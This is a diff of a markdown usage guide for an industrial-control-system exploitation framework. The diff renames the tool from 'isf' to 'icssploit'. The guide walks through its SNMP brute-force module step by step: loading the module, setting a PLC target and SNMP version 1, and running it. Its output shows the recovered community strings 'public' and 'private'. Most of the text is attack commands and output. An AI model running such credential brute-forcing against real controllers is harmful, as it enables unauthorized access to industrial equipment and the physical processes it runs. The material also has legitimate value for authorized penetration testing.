@@ -1,7 +1,7 @@
 # SNMP Bruteforece
 
 # Use SNMP bruteforece module
-    root@kali:~/Desktop/temp/isf# python isf.py
+    root@kali:~/Desktop/temp/icssploit# python icssploit.py
     
       _____ _____  _____ _____ _____  _      ____ _____ _______
      |_   _/ ____|/ ____/ ____|  __ \| |    / __ \_   _|__   __|
@@ -24,14 +24,14 @@
         PLC: 2          ICS Switch: 0
         Software: 0
     
-    isf > search snmp
+    icssploit > search snmp
     creds/snmp_bruteforce
-    isf > use creds/snmp_bruteforce
-    isf (SNMP Bruteforce) >
+    icssploit > use creds/snmp_bruteforce
+    icssploit (SNMP Bruteforce) >
 
     
 # set options
-    isf (SNMP Bruteforce) > show options
+    icssploit (SNMP Bruteforce) > show options
 
     Target options:
     
@@ -49,16 +49,16 @@
        threads             8                                                              Number of threads
        stop_on_success     yes                                                            Stop on first valid community string
        verbosity           yes                                                            Display authentication attempts
-       snmp                file:///root/Desktop/temp/isf/icssploit/wordlists/snmp.txt     Community string or file with community strings (file://)
+       snmp                file:///root/Desktop/temp/icssploit/icssploit/wordlists/snmp.txt     Community string or file with community strings (file://)
     
-    isf (SNMP Bruteforce) > set target 192.168.70.210
+    icssploit (SNMP Bruteforce) > set target 192.168.70.210
     [+] {'target': '192.168.70.210'}
     # Some PLC only support snmp version 1
-    isf (SNMP Bruteforce) > set version 1
+    icssploit (SNMP Bruteforce) > set version 1
     [+] {'version': '1'}
 
 # run module
-    isf (SNMP Bruteforce) > run
+    icssploit (SNMP Bruteforce) > run
     [*] Running module...
     [*] worker-0 thread is starting...
     [*] worker-1 thread is starting...
@@ -88,4 +88,4 @@
        192.168.70.210     161      public
        192.168.70.210     161      private
     
-    isf (SNMP Bruteforce) >
+    icssploit (SNMP Bruteforce) >
